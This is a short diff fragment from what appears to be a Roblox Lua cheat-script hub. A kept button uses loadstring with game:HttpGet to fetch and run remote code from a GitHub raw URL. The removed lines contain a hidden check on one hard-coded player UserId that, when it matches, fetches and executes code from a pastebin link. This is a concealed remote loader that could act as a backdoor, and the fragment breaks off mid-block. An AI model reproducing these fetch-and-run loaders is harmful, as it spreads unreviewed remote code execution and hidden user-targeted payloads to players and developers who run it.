@@ -823,12 +823,3 @@ end)
 Scripts:Button("Slow-Drink", function()
 	   loadstring(game:HttpGet("https://raw.githubusercontent.com/RikoTheDemonHunter/V3/refs/heads/main/Slow.lua"))()
 end)		
-
-local userids = {1497286101,}
-
-for i = 1,#userids do
-if game.Players.LocalPlayer.UserId == userids[i] then
-
-local lib = {loadstring(game:HttpGet("https://pastebin.com/raw/wYnd92Av"))()}
-
-
